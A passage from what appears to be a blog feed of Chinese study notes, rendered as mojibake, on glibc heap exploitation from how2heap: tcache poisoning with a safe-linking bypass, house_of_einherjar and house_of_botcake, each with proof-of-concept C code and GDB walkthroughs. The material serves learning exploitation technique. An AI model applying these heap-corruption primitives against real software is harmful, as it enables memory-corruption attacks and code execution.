æŒ‡é’ˆï¼Œå¯ä»¥åˆ†é…åˆ°ä»»æ„åœ°å€ã€‚</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><ul><li><p>tcache ä¹Ÿæ˜¯ä½¿ç”¨ ç±»ä¼¼ bins æ–¹å¼æ¥ç®¡ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span>  </span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="hljs-comment">// TCACHE_MAX_BINS = 64</span><br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure><p>æ¯ä¸€é¡¹ <code>tcache_perthread_struct</code> ç”±ç›¸åŒå¤§å°çš„ chunk é€šè¿‡ <code>tcache_entry</code> ä½¿ç”¨å•å‘é“¾è¡¨é“¾æ¥ã€‚</p><p>counts ç”¨äºè®°å½• entries ä¸­æ¯ä¸€é¡¹å½“å‰é“¾å…¥çš„ chunk æ•°ç›®ï¼Œ æœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkã€‚</p><p><code>tcache_entry</code> ç”¨äºé“¾æ¥ chunk çš„ç»“æ„ä½“ï¼Œ å…¶ä¸­å°±ä¸€ä¸ª next æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªç›¸åŒå¤§å°çš„ chunk.</p></li><li><p>glibc2.32 ä¹‹åå¼•å…¥äº† PROTECT_PTR åœ°å€ä¿æŠ¤ï¼Œåº”ç”¨åœ¨ tcache bin å’Œ fast bin ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br> <br> <br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br> <br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache_key;<br> <br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>e-&gt;next</code> æœ€ç»ˆæŒ‡å‘äº† <code>e-&gt;next</code> åœ°å€å³ç§» 12 ä½åçš„å€¼ä¸å½“å‰ <code>tcache</code> å¤´æŒ‡é’ˆå€¼å¼‚æˆ–åçš„å€¼ã€‚</p></li></ul><blockquote><p>æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> <span class="hljs-built_in">stack</span>[<span class="hljs-number">0x10</span>];<br>&gt;<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>&gt;<span class="hljs-keyword">while</span> ((<span class="hljs-type">long</span>)&amp;<span class="hljs-built_in">stack</span>[i]&amp;<span class="hljs-number">0xf</span>) i++;<br>&gt;<span class="hljs-type">size_t</span> *target = &amp;<span class="hljs-built_in">stack</span>[i];<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-type">size_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-built_in">free</span>(a);<br>&gt;<span class="hljs-built_in">free</span>(b);<br>&gt;b[<span class="hljs-number">0</span>] = (<span class="hljs-type">size_t</span>)((<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)b &gt;&gt; <span class="hljs-number">12</span>));<br>&gt;<span class="hljs-type">size_t</span> * xx = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-type">size_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;assert( c == target);<br>&gt;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><p><strong>GDB è°ƒè¯•</strong></p><p>é¦–å…ˆç”³è¯·äº†ä¸€ä¸ª 0x10 å¤§å°çš„å †å—ï¼Œå¹¶æ£€æŸ¥åœ°å€æ˜¯å¦ 0x10 å­—èŠ‚å¯¹é½ï¼Œè¿™ä¸ªæ•°ç»„å°±æ˜¯ä¸ºäº†æ‰¾åˆ°ä¸€ä¸ªå¯¹å…¶çš„åœ°å€ã€‚</p><p>å› ä¸ºç”³è¯·å’Œé‡Šæ”¾çš„åœ°å€å¿…é¡»æ˜¯ 0x10 å­—èŠ‚å¯¹é½çš„ï¼Œ<strong>å¦‚æœè¦è¦†ç›–ä¸ºæˆ‘ä»¬ä»»æ„çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªä»»æ„åœ°å€ä¹Ÿåº”è¯¥è¦å¯¹é½</strong>ã€‚æ£€æŸ¥åˆ°ä¸€ä¸ªå¯¹é½çš„å°±å¯ä»¥ break äº†ã€‚</p><blockquote><p>0xf çš„äºŒè¿›åˆ¶ä¸º 1111 ï¼Œå¦‚æœåœ°å€æ˜¯ 0x10 å¯¹é½ï¼Œé‚£ä¹ˆæœ€å 4 ä½äºŒè¿›åˆ¶ä½åº”è¯¥æ˜¯ 0000 ã€‚æ‰€ä»¥ <code>&amp;0xf</code> å°±æ˜¯å–æœ€åå››ä½äºŒè¿›åˆ¶ä½è¿›è¡Œä¸è¿ç®—ï¼Œå¦‚æœè¿ç®—ç»“æœæ˜¯ 0 ï¼Œé‚£ä¹ˆè¯æ˜æ£€æµ‹åœ°å€çš„æœ€å 4 ä½äºŒè¿›åˆ¶ä½åº”è¯¥æ˜¯ 0000ï¼Œå³0x10 å¯¹é½ã€‚</p></blockquote><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_stack.png"></p><p>è¿™æ ·stack[1] å°±å¯ä»¥è¢« target ç”¨æ‰ï¼Œç»éªŒè¯ä¹Ÿçš„ç¡®å¦‚æ­¤ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_target.png"></p><p>æ¥ç€æˆ‘ä»¬ç”³è¯·ä¸¤ä¸ªå †å—ï¼Œå† free æ‰</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_free2.png"></p><p>è¿™é‡Œçš„ fd æŒ‡é’ˆå®é™…ä¸Šå°±æ˜¯ next æŒ‡é’ˆ</p><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>b-&gt;next</code> ï¼ŒåŸæœ¬æ˜¯æŒ‡å‘ a çš„åœ°å€ï¼Œä¿®æ”¹æˆ target_addr ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_free.png"></p><p>æˆ‘ä»¬å†ç”³è¯·ä¸¤ä¸ªchunkï¼Œ b è¢«åˆ†é…å‡ºå»åï¼Œéšåå°±ä¼šåˆ†é… <code>b-&gt;next</code> æŒ‡é’ˆæŒ‡å‘çš„æ ˆä¸Šçš„åœ°å€ã€‚</p><h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h1><blockquote><p>ä¸å¤ªæ‡‚ï¼Œç­‰ç€ä¹‹åè¡¥å……ä¸€ä¸‹å§ğŸ˜¢</p></blockquote><p><strong>åŸç†ï¼š</strong>é€šè¿‡æº¢å‡ºè¦†ç›–ç‰©ç†ç›¸é‚»é«˜åœ°å€çš„ <code>prev_size</code> å’Œ <code>prev_inuse</code> ä½ï¼Œ free çš„æ—¶å€™å°±ä¼šè§¦å‘åˆå¹¶ä¸ unlink ï¼Œè€Œåˆå¹¶çš„ size æ˜¯ç”±æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å¯ä»¥åŒæ—¶æ§åˆ¶ä¸€ä¸ª chunk <code>prev_size</code> ä¸ <code>prev_inuse</code> å­—æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†æ–°çš„ chunk æŒ‡å‘å‡ ä¹ä»»ä½•ä½ç½®ã€‚</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>    &amp;&amp; tcache<br>    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        victim = tcache_get (tc_idx);<br>        <span class="hljs-keyword">return</span> tag_new_usable (victim);<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä» tcache bin å–å‡º chunk çš„æ£€æµ‹ä¸­ï¼Œä¸å†æ˜¯ <code>tcache-&gt;entries[tc_idx] &gt; 0</code>ï¼Œè€Œæ˜¯ <code>tcache-&gt;counts[tc_idx] &gt; 0</code>ã€‚</p><blockquote><p>æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> *x[<span class="hljs-number">7</span>];<br>&gt;<span class="hljs-type">size_t</span> <span class="hljs-built_in">stack</span>[<span class="hljs-number">16</span>],i = <span class="hljs-number">0</span>;<br>&gt;<span class="hljs-keyword">while</span> ((<span class="hljs-type">long</span>)&amp;<span class="hljs-built_in">stack</span>[i]&amp;<span class="hljs-number">0xf</span>) i++;<br>&gt;<span class="hljs-type">size_t</span> *target = &amp;<span class="hljs-built_in">stack</span>[i];<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>&gt;a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>&gt;a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>&gt;a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// prepare fwd == bck for unlink</span><br>&gt;a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">//</span><br>&gt;<span class="hljs-type">u_int8_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>&gt;<span class="hljs-type">u_int8_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf0</span>);<br>&gt;b[<span class="hljs-number">0x20</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// set c prevsize</span><br>&gt;b[<span class="hljs-number">0x28</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// null byte of c size&#x27;s least significant byte</span><br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf0</span>);<br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(x[i]);<br>&gt;<span class="hljs-built_in">free</span>(c);  <span class="hljs-comment">// tcache is full so consolidate with our fake chunk then go into unsortbin</span><br>&gt;<span class="hljs-type">size_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>); <span class="hljs-comment">//cash out from unsortbin</span><br>&gt;<span class="hljs-type">void</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>); <span class="hljs-comment">// free one more chunk to bypass</span><br>&gt;<span class="hljs-built_in">free</span>(pad);<br>&gt;<span class="hljs-built_in">free</span>(b);<br>&gt;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>); <span class="hljs-comment">//posion tcache  point to target</span><br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>); <span class="hljs-comment">//cash out b</span><br>&gt;assert(<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>) == target);<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><p><strong>GDB è°ƒè¯•</strong></p><p>æˆ‘ä»¬å…ˆæ‰¾ä¸€ä¸ªåˆé€‚çš„ target åœ°å€ï¼Œç„¶åç”³è¯·ä¸€ä¸ªå †å—ï¼Œå¹¶åœ¨å…¶ä¸­æ„é€  fake chunk ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_free2.png"></p><p>éœ€è¦æ³¨æ„è¿™é‡Œçš„æŒ‡é’ˆæ£€æŸ¥çš„ç»•è¿‡åªéœ€è¦ <code>p-&gt;fd=p</code>ã€<code>p-&gt;bk=p</code> ã€‚</p><p>æˆ‘ä»¬å†ç”³è¯·ä¸¤ä¸ªå †å—ï¼ŒåŒæ—¶ä¿®æ”¹å¯¹åº”çš„ <code>prev_size</code> å’Œ <code>prev_inuse</code> ä½ï¼ŒæŠŠ <code>prev_size</code> ä¿®æ”¹æˆ 0x60ï¼Œ<code>prev_inuse</code> ç”± 1 ä¿®æ”¹æˆ 0 ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_malloc2.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¡«æ»¡ tcachebin ï¼Œå† <code>free(c)</code></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_free3.png"></p><p>è¿™æ · chunk c å°±ä¼šè§¦å‘åå‘åˆå¹¶ï¼Œè¿›å…¥ unsortedbinã€‚è¿™æ ·ä¹‹åï¼Œæˆ‘ä»¬å†ç”³è¯·çš„å †å—åœ°å€å°±ä¼šæ˜¯ <code>chunk_a-0x10</code>ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨åˆ° tcache bin ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠ chunk_b æ”¾è¿› tcache binã€‚é¦–å…ˆç”³è¯·ä¸€ä¸ªå †å—å†é‡Šæ”¾ç”¨æ¥å¡«å…… <code>tcache-&gt;counts</code> æ•°ç»„</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_padding.png"></p><p>éšåæˆ‘ä»¬ä¿®æ”¹ chunk_bçš„ fd æŒ‡é’ˆä¸º target_addrï¼Œè¿™æ ·ç¬¬äºŒä¸ªç”³è¯·åˆ°çš„ chunk å°±æ˜¯ target_addrã€‚</p><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h1><p><strong>åŸç†ï¼š</strong>ä»¤ chunk å­˜åœ¨äºä¸¤ä¸ª bin ä¸­ï¼Œå³ double free ã€‚å†åˆ©ç”¨ overlap chunk å¯ä»¥ä¿®æ”¹ tcache bin ä¸­ double free chunk çš„ <em>fd</em> æŒ‡é’ˆï¼Œè¿™æ ·å†æ¬¡ç”³è¯· malloc çš„æ—¶å€™å°±ä¼šç”³è¯·åˆ°ç›®æ ‡åœ°å€ã€‚</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> stack_var[<span class="hljs-number">4</span>];<br>&gt;<span class="hljs-type">size_t</span> *x[<span class="hljs-number">7</span>];<br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//padding chunk or will double free</span><br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(x[i]);<br>&gt;<span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">// a in unsorted bin</span><br>&gt;<span class="hljs-built_in">free</span>(prev);<br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">// a in tcache</span><br>&gt;<span class="hljs-type">size_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xb0</span>);<br>&gt;b[<span class="hljs-number">0x90</span>/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = (<span class="hljs-type">size_t</span>)((<span class="hljs-type">long</span>)stack_var ^ ((<span class="hljs-type">long</span>)a &gt;&gt; <span class="hljs-number">12</span>));<span class="hljs-comment">// poison tcache</span><br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;assert(c == stack_var);<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><p><strong>GDB è°ƒè¯•</strong></p><p>å¼€å¤´çš„éƒ¨åˆ†å°±æ˜¯åç»­å¡«å…… tcachebin çš„chunkã€‚å…¶ä¸­ç”³è¯·çš„æ•°ç»„ stack_var ç”¨æ¥æ¨¡æ‹Ÿæˆ‘ä»¬å¸Œæœ›æ§åˆ¶çš„åœ°å€ã€‚</p><p>æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå †å— <em>prev</em> ç”¨æ¥ overlap ï¼Œå†ç”³è¯·ä¸€ä¸ªå †å— <em>a</em> ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å°†è¦åˆ©ç”¨çš„å †å—ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_prev_a.png"></p><p>å¡«å…… tcachebin ä¹‹åæˆ‘ä»¬ free å †å— <em>a</em> ï¼Œ<em>a</em> ä¼šè¿›å…¥ unsortedbin ã€‚å†æ¬¡ free <em>prev</em>  çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘ <code>consolidate forward</code>ï¼Œä¸ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€ chunk <em>a</em> è¿›è¡Œåˆå¹¶ã€‚</p><p>è¿™æ—¶å€™ä» tcachebin ä¸­ç”³è¯·ä¸€ä¸ª 0x80 å¤§å°çš„ chunkï¼Œè®© tcachebin ç©ºå‡ºä¸€ä¸ªä½ç½®ã€‚å† free <em>a</em> ï¼ˆdouble freeï¼‰çš„æ—¶å€™ chunk <em>a</em> å°±ä¼šè¿›å…¥ tcachebin é“¾çš„å¤´éƒ¨ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_free_a.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±é€ æˆäº†å †å— a çš„å †å ã€‚æ­¤æ—¶å †å— prev éƒ¨åˆ†çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_prev.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å †å çš„æ¼æ´ä¿®æ”¹ chunk a çš„ fdã€bk æŒ‡é’ˆä¸ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼ˆstack çš„åœ°å€ï¼‰ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±æŠŠç›®æ ‡åœ°å€é“¾å…¥äº† tcachebinã€‚</p><p>ä¸‹è¾¹çš„åˆ©ç”¨å°±ä¸€æ ·å•¦ï¼ç”³è¯·ä¸¤æ¬¡å°±å¯ä»¥ç”³è¯·åˆ° stack å•¦ğŸ¤—</p><hr><p>è„‘å­è½¬ä¸åŠ¨äº†ï¼Œå…ˆå­¦åˆ°è¿™é‡ŒğŸ˜¢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heapæ·±å…¥æµ…å‡ºå­¦ä¹ å †åˆ©ç”¨(ä¸€)</title>
    <link href="/2024/03/02/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2024/03/02/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
